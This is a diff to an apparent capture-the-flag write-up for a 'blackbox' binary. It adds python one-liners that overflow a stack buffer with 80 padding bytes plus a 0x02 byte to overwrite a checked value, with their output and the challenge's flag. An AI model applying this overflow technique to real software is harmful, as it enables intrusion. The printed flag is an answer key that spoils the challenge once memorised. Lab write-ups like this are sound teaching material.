@@ -13,7 +13,23 @@ Blackbox
 -./blackbox
 -->What is 1 + 1 = 2
    No dummy... 1 + 1 != 0...
+
+-python3 -c 'print("Z"*100)' | ./blackbox
+What is 1 + 1 = No dummy... 1 + 1 != 1515870810...
+*** stack smashing detected ***: <unknown> terminated
+
+[5]+  Stopped                 python3 -c 'print("Z"*100)' | ./blackbox
+
 -
+
+-python3 -c 'print("Z" * 80)' | ./blackbox
+What is 1 + 1 = No dummy... 1 + 1 != 0...
+
+-python3 -c 'print("Z" * 80 + "\x02")' | ./blackbox
+What is 1 + 1 = CORRECT! You get flag: 
+flag{0n3_4lus_1_1s_Tw0_dumm13!!}
+
+[4]+  Stopped                 python3 -c 'print("Z" * 80 + "\x02")' | ./blackbox
 
 Writed by Cloclodudu and Asch-sys
 
